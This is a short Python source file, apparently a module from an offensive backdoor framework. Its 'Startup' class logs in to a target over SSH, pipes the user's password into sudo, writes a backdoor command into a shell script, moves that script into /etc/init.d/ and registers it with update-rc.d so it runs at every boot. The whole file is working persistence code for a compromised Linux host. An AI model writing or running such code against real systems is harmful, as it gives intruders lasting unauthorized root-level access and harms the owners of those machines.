from .module import *

class Startup(Module):

    def __init__(self, target, backdoor, core):
        self.core = core
        self.target = target
        self.name = "startup"
        self.backdoor = backdoor
        self.options = {
                }

    def exploit(self):
        self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S echo \'" + self.backdoor.get_command() + "\' > file1234.sh")
        self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S chmod +x file1234.sh")
        self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S mv file1234.sh /etc/init.d/")
        self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S update-rc.d file1234.sh defaults")
        print(GOOD + self.name + " module success")
